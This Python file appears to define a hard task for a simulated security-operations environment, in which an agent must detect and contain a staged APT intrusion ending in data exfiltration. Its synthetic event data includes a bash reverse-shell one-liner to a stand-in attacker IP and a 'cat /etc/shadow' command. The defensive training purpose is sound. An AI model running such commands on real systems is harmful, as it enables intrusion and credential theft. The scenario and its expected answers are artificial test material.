"""
HARD TASK — Multi-Stage APT Attack (Recon → Lateral Movement → Exfiltration)
==============================================================================
Scenario:
  An Advanced Persistent Threat (APT) actor executes a classic kill-chain:

  STAGE 1  │ Reconnaissance   — port scan from staging IP
  STAGE 2  │ Initial Access   — exploited web server, reverse shell planted
  STAGE 3  │ Lateral Movement — credential dump, RDP to internal finance DB
  STAGE 4  │ Data Exfiltration— 4.2 GB transferred to external C2 over HTTPS

The agent must detect activity at each stage and take correct actions.  
Ideal response blocks C2 IP, isolates compromised hosts, and escalates.

Difficulty: HARD
Max steps  : 15
Deterministic seed: 999
"""

from __future__ import annotations

from datetime import datetime
from typing import List

from models import (
    Alert, EventType, SecurityEvent, SOCObservation, SystemState, ThreatLevel,
)


# ---------------------------------------------------------------------------
# STAGE 1 — Reconnaissance (port scan)
# ---------------------------------------------------------------------------

RECON_PORT_SCAN = SecurityEvent(
    event_id="EVT-APT-001",
    timestamp=datetime(2024, 8, 5, 3, 11, 0),
    event_type=EventType.PORT_SCAN,
    source_ip="198.51.100.77",
    dest_ip="10.0.0.0/24",
    user_id=None,
    host_id=None,
    country="NL",
    details={
        "ports_scanned": list(range(20, 25)) + [80, 443, 3389, 5985, 8080, 8443],
        "scan_type": "SYN_STEALTH",
        "packets_sent": 48000,
        "duration_s": 120,
        "tool_fingerprint": "NMAP",
    },
    raw_log=(
        "2024-08-05T03:11:00Z [IDS] PORT_SCAN src=198.51.100.77 (NL) "
        "target=10.0.0.0/24 type=SYN_STEALTH ports=20-24,80,443,3389,5985,8080,8443 "
        "pkts=48000 tool=NMAP"
    ),
)

RECON_DNS_ENUM = SecurityEvent(
    event_id="EVT-APT-002",
    timestamp=datetime(2024, 8, 5, 3, 13, 22),
    event_type=EventType.DNS_QUERY,
    source_ip="198.51.100.77",
    dest_ip="8.8.8.8",
    user_id=None,
    host_id=None,
    country="NL",
    details={
        "queries": [
            "mail.acmecorp.com", "vpn.acmecorp.com", "db.acmecorp.com",
            "admin.acmecorp.com", "jira.acmecorp.com",
        ],
        "record_types": ["A", "MX", "TXT"],
        "pattern": "subdomain_enumeration",
    },
    raw_log=(
        "2024-08-05T03:13:22Z [DNS] ENUM src=198.51.100.77 "
        "subdomains=[mail,vpn,db,admin,jira].acmecorp.com"
    ),
)

# ---------------------------------------------------------------------------
# STAGE 2 — Initial Access (web shell planted on public web server)
# ---------------------------------------------------------------------------

WEBSHELL_PLANT = SecurityEvent(
    event_id="EVT-APT-003",
    timestamp=datetime(2024, 8, 5, 3, 28, 55),
    event_type=EventType.MALWARE_EXEC,
    source_ip="198.51.100.77",
    dest_ip="10.0.0.10",
    user_id="www-data",
    host_id="WEB-SRV-01",
    country="NL",
    details={
        "method": "POST /upload.php HTTP/1.1",
        "payload": "b374k_webshell.php (obfuscated)",
        "file_written": "/var/www/html/images/b374k.php",
        "exploit": "CVE-2024-1234 (File Upload Bypass)",
        "reverse_shell": "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1",
    },
    raw_log=(
        "2024-08-05T03:28:55Z [WAF] BLOCKED_THEN_PASSED POST /upload.php "
        "src=198.51.100.77 payload=webshell.php CVE-2024-1234"
    ),
)

REVERSE_SHELL = SecurityEvent(
    event_id="EVT-APT-004",
    timestamp=datetime(2024, 8, 5, 3, 29, 30),
    event_type=EventType.MALWARE_EXEC,
    source_ip="10.0.0.10",   # Outbound from compromised host
    dest_ip="198.51.100.77",
    user_id="www-data",
    host_id="WEB-SRV-01",
    country="NL",
    details={
        "connection_type": "reverse_shell",
        "port": 4444,
        "process": "bash",
        "parent_process": "php-fpm",
        "commands": ["id", "uname -a", "cat /etc/shadow", "ip addr"],
    },
    raw_log=(
        "2024-08-05T03:29:30Z [NDR] OUTBOUND_SHELL src=10.0.0.10 (WEB-SRV-01) "
        "dst=198.51.100.77:4444 proc=bash parent=php-fpm"
    ),
)

# ---------------------------------------------------------------------------
# STAGE 3 — Lateral Movement (credential dump → RDP pivot)
# ---------------------------------------------------------------------------

CREDENTIAL_DUMP = SecurityEvent(
    event_id="EVT-APT-005",
    timestamp=datetime(2024, 8, 5, 3, 35, 18),
    event_type=EventType.PRIVILEGE_ESCALATION,
    source_ip="10.0.0.10",
    dest_ip=None,
    user_id="www-data",
    host_id="WEB-SRV-01",
    country="US",  # Internal host
    details={
        "tool": "mimikatz-linux-port",
        "credentials_dumped": ["backup-svc:P@ssw0rd2024!", "sysadmin:C0rp$ys2024"],
        "lsass_access": True,
        "technique": "OS Credential Dumping",
    },
    raw_log=(
        "2024-08-05T03:35:18Z [EDR] ALERT host=WEB-SRV-01 proc=python3 "
        "action=read_lsass_memory tool=mimikatz_variant"
    ),
)

LATERAL_MOVE_RDP = SecurityEvent(
    event_id="EVT-APT-006",
    timestamp=datetime(2024, 8, 5, 3, 41, 0),
    event_type=EventType.LATERAL_MOVEMENT,
    source_ip="10.0.0.10",
    dest_ip="10.10.5.50",
    user_id="backup-svc",
    host_id="FINANCE-DB-01",
    country="US",
    details={
        "protocol": "RDP",
        "port": 3389,
        "auth_method": "stolen_credentials",
        "source_host": "WEB-SRV-01",
        "target_host": "FINANCE-DB-01",
        "session_id": "rdp-sess-77c3a1",
    },
    raw_log=(
        "2024-08-05T03:41:00Z [DC] RDP_AUTH SUCCESS user=backup-svc "
        "src=10.0.0.10 (WEB-SRV-01) dst=10.10.5.50 (FINANCE-DB-01)"
    ),
)

DB_QUERY_DUMP = SecurityEvent(
    event_id="EVT-APT-007",
    timestamp=datetime(2024, 8, 5, 3, 44, 30),
    event_type=EventType.FILE_ACCESS,
    source_ip="10.10.5.50",
    dest_ip=None,
    user_id="backup-svc",
    host_id="FINANCE-DB-01",
    country="US",
    details={
        "db_name": "finance_prod",
        "tables_accessed": ["customer_pii", "transactions", "salary_details"],
        "rows_exported": 2450000,
        "export_file": "/tmp/.cache/dump_20240805.sql.gz",
        "sql": "SELECT * FROM customer_pii; SELECT * FROM transactions WHERE ...",
    },
    raw_log=(
        "2024-08-05T03:44:30Z [DB-AUDIT] QUERY user=backup-svc "
        "db=finance_prod tables=customer_pii,transactions rows=2.45M exported=/tmp/.cache/dump_*.sql.gz"
    ),
)

# ---------------------------------------------------------------------------
# STAGE 4 — Data Exfiltration
# ---------------------------------------------------------------------------

DATA_EXFIL_EVENT = SecurityEvent(
    event_id="EVT-APT-008",
    timestamp=datetime(2024, 8, 5, 3, 52, 0),
    event_type=EventType.DATA_EXFIL,
    source_ip="10.10.5.50",
    dest_ip="198.51.100.77",
    user_id="backup-svc",
    host_id="FINANCE-DB-01",
    country="NL",
    details={
        "protocol": "HTTPS",
        "port": 443,
        "bytes_transferred": 4_508_876_800,  # ~4.2 GB
        "duration_s": 380,
        "c2_domain": "cdn-update.legit-looking.nl",
        "c2_ip": "198.51.100.77",
        "dns_tunneling": False,
        "ssl_inspection_bypass": True,
    },
    raw_log=(
        "2024-08-05T03:52:00Z [DLP] LARGE_UPLOAD src=10.10.5.50 (FINANCE-DB-01) "
        "dst=198.51.100.77:443 (NL) bytes=4.2GB proto=HTTPS duration=380s"
    ),
)

C2_BEACON = SecurityEvent(
    event_id="EVT-APT-009",
    timestamp=datetime(2024, 8, 5, 4, 0, 0),
    event_type=EventType.NETWORK_SCAN,
    source_ip="10.0.0.10",
    dest_ip="198.51.100.77",
    user_id=None,
    host_id="WEB-SRV-01",
    country="NL",
    details={
        "beacon_interval_s": 60,
        "jitter_ms": 500,
        "c2_protocol": "HTTPS",
        "c2_domain": "cdn-update.legit-looking.nl",
        "beacons_observed": 12,
    },
    raw_log=(
        "2024-08-05T04:00:00Z [NDR] C2_BEACON src=WEB-SRV-01 "
        "dst=198.51.100.77 interval=60s jitter=500ms beacons=12"
    ),
)

# ---------------------------------------------------------------------------
# Alerts
# ---------------------------------------------------------------------------

RECON_ALERT = Alert(
    alert_id="ALT-201",
    title="External Port Scan: 198.51.100.77 scanned entire /24 subnet",
    description=(
        "Stealth SYN scan from Dutch IP 198.51.100.77 covering all common "
        "service ports across the 10.0.0.0/24 range. NMAP fingerprint detected. "
        "Followed by DNS subdomain enumeration of acmecorp.com."
    ),
    threat_level=ThreatLevel.MEDIUM,
    related_events=["EVT-APT-001", "EVT-APT-002"],
    anomaly_score=0.72,
    triggered_at=datetime(2024, 8, 5, 3, 15, 0),
    mitre_tactic="Reconnaissance",
    mitre_technique="T1595.001",
)

INITIAL_ACCESS_ALERT = Alert(
    alert_id="ALT-202",
    title="Web Shell Planted on WEB-SRV-01 (CVE-2024-1234)",
    description=(
        "WAF bypass detected — PHP file upload succeeded despite content policy. "
        "Reverse shell callback to 198.51.100.77:4444 observed 35 seconds later. "
        "Attacker issued reconnaissance commands on compromised web server."
    ),
    threat_level=ThreatLevel.CRITICAL,
    related_events=["EVT-APT-003", "EVT-APT-004"],
    anomaly_score=0.98,
    triggered_at=datetime(2024, 8, 5, 3, 30, 0),
    mitre_tactic="Execution",
    mitre_technique="T1059.004",  # Unix Shell
)

LATERAL_MOVEMENT_ALERT = Alert(
    alert_id="ALT-203",
    title="Lateral Movement: WEB-SRV-01 → FINANCE-DB-01 via Stolen Credentials",
    description=(
        "Credential dump via mimikatz on WEB-SRV-01 followed by RDP authentication "
        "to FINANCE-DB-01 using service account backup-svc. "
        "Post-pivot: 2.45M database rows exported to staging file."
    ),
    threat_level=ThreatLevel.CRITICAL,
    related_events=["EVT-APT-005", "EVT-APT-006", "EVT-APT-007"],
    anomaly_score=0.99,
    triggered_at=datetime(2024, 8, 5, 3, 45, 0),
    mitre_tactic="Lateral Movement",
    mitre_technique="T1021.001",  # Remote Desktop Protocol
)

EXFIL_ALERT = Alert(
    alert_id="ALT-204",
    title="DATA EXFILTRATION: 4.2 GB Transferred to C2 (198.51.100.77)",
    description=(
        "4.2 GB uploaded from FINANCE-DB-01 to known attacker C2 "
        "(198.51.100.77, cdn-update.legit-looking.nl) over HTTPS. "
        "DLP alert: data matches customer PII and financial transaction fingerprints. "
        "C2 beacon on WEB-SRV-01 (60s interval) also detected."
    ),
    threat_level=ThreatLevel.CRITICAL,
    related_events=["EVT-APT-008", "EVT-APT-009"],
    anomaly_score=1.0,
    triggered_at=datetime(2024, 8, 5, 3, 55, 0),
    mitre_tactic="Exfiltration",
    mitre_technique="T1041",
)

ALL_EVENTS = [
    RECON_PORT_SCAN, RECON_DNS_ENUM,
    WEBSHELL_PLANT, REVERSE_SHELL,
    CREDENTIAL_DUMP, LATERAL_MOVE_RDP, DB_QUERY_DUMP,
    DATA_EXFIL_EVENT, C2_BEACON,
]

ALL_ALERTS = [RECON_ALERT, INITIAL_ACCESS_ALERT, LATERAL_MOVEMENT_ALERT, EXFIL_ALERT]

ATTACK_STAGES = {
    "reconnaissance": ["EVT-APT-001", "EVT-APT-002"],
    "initial_access": ["EVT-APT-003", "EVT-APT-004"],
    "lateral_movement": ["EVT-APT-005", "EVT-APT-006", "EVT-APT-007"],
    "exfiltration": ["EVT-APT-008", "EVT-APT-009"],
}

C2_IP = "198.51.100.77"
COMPROMISED_HOSTS = {"WEB-SRV-01", "FINANCE-DB-01"}
COMPROMISED_USER = "backup-svc"


class HardTask:
    """
    Task definition for the HARD scenario.

    Multi-stage APT attack.  Correct response requires the agent to:
    1. Detect recon (block_ip C2)
    2. Detect initial access (isolate_host WEB-SRV-01)
    3. Detect lateral movement (isolate_host FINANCE-DB-01, flag_user backup-svc)
    4. Detect exfiltration (escalate_alert)
    """

    TASK_ID = "hard_apt_multistage"
    MAX_STEPS = 15
    
    def __init__(self, **kwargs):
        self.c2_ip = kwargs.get("attacker_ip") or C2_IP
        self.compromised_user = kwargs.get("target_user") or COMPROMISED_USER
        self.compromised_hosts = set(COMPROMISED_HOSTS)

    DESCRIPTION = (
        "A multi-stage APT attack: port scan → web shell → credential dump "
        "→ lateral movement → 4.2 GB data exfiltration.  "
        "Detect each stage and contain the threat."
    )

    def get_initial_observation(self, episode_id: str) -> SOCObservation:
        """Return initial state — only stage 1 events visible at start."""
        stage_events = [e.model_copy(deep=True) for e in [RECON_PORT_SCAN, RECON_DNS_ENUM]]
        stage_alert = RECON_ALERT.model_copy(deep=True)
        self._rewrite_entities(stage_events, [stage_alert])
        return SOCObservation(
            done=False,
            reward=0.0,
            metadata={"episode_id": episode_id},
            task_id=self.TASK_ID,
            step_number=0,
            timestamp=datetime(2024, 8, 5, 3, 16, 0),
            recent_events=stage_events,
            active_alerts=[stage_alert],
            system_state=SystemState(
                active_connections=892,
                blocked_ips=[],
                flagged_users=[],
                isolated_hosts=[],
                open_incidents=1,
                risk_score=0.45,
            ),
            network_anomaly_score=0.51,
            attack_stage="reconnaissance",
        )

    def get_events_for_stage(self, stage: str) -> List[SecurityEvent]:
        """Return events visible at each attack stage."""
        stage_map = {
            "reconnaissance": [RECON_PORT_SCAN, RECON_DNS_ENUM],
            "initial_access": [WEBSHELL_PLANT, REVERSE_SHELL],
            "lateral_movement": [CREDENTIAL_DUMP, LATERAL_MOVE_RDP, DB_QUERY_DUMP],
            "exfiltration": [DATA_EXFIL_EVENT, C2_BEACON],
        }
        events = [e.model_copy(deep=True) for e in stage_map.get(stage, [])]
        self._rewrite_entities(events, [])
        return events

    def get_alerts_for_stage(self, stage: str):
        stage_map = {
            "reconnaissance": [RECON_ALERT],
            "initial_access": [RECON_ALERT, INITIAL_ACCESS_ALERT],
            "lateral_movement": [LATERAL_MOVEMENT_ALERT],
            "exfiltration": [EXFIL_ALERT],
        }
        alerts = [a.model_copy(deep=True) for a in stage_map.get(stage, [])]
        self._rewrite_entities([], alerts)
        return alerts

    def get_threat_targets(self) -> dict:
        return {
            "c2_ip": self.c2_ip,
            "compromised_hosts": self.compromised_hosts,
            "compromised_user": self.compromised_user,
            "attack_stages": list(ATTACK_STAGES.keys()),
        }

    def _rewrite_entities(self, events: List[SecurityEvent], alerts: List[Alert]) -> None:
        for ev in events:
            if ev.source_ip == C2_IP:
                ev.source_ip = self.c2_ip
            if ev.dest_ip == C2_IP:
                ev.dest_ip = self.c2_ip
            if ev.user_id == COMPROMISED_USER:
                ev.user_id = self.compromised_user
            if ev.raw_log:
                ev.raw_log = ev.raw_log.replace(C2_IP, self.c2_ip).replace(COMPROMISED_USER, self.compromised_user)
            if isinstance(ev.details, dict):
                if ev.details.get("c2_ip") == C2_IP:
                    ev.details["c2_ip"] = self.c2_ip
                creds = ev.details.get("credentials_dumped")
                if isinstance(creds, list):
                    ev.details["credentials_dumped"] = [c.replace(COMPROMISED_USER, self.compromised_user) for c in creds]

        for alert in alerts:
            alert.title = alert.title.replace(C2_IP, self.c2_ip)
            alert.description = alert.description.replace(C2_IP, self.c2_ip).replace(COMPROMISED_USER, self.compromised_user)
